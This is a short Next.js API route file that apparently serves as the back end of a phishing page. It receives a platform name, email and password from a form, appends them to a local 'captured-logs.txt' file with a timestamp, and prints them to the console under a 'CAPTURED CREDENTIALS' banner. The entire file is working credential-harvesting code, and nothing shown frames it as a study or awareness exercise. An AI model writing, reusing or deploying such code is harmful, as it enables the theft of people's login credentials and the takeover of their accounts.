import { NextResponse } from "next/server";
import { appendFile } from "fs/promises";
import { join } from "path";

export async function POST(request: Request) {
  const body = await request.json();
  const { platform, email, password } = body as {
    platform: string;
    email: string;
    password: string;
  };

  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] [${platform}] Email: ${email} | Password: ${password}\n`;

  const logPath = join(process.cwd(), "captured-logs.txt");
  await appendFile(logPath, line, "utf-8");

  console.log("\n\x1b[41m\x1b[37m 🚨 CAPTURED CREDENTIALS \x1b[0m");
  console.log(`\x1b[33m   Platform : \x1b[0m${platform}`);
  console.log(`\x1b[33m   Email    : \x1b[0m${email}`);
  console.log(`\x1b[33m   Password : \x1b[0m${password}`);
  console.log(`\x1b[90m   Time     : ${timestamp}\x1b[0m\n`);

  return NextResponse.json({ ok: true });
}
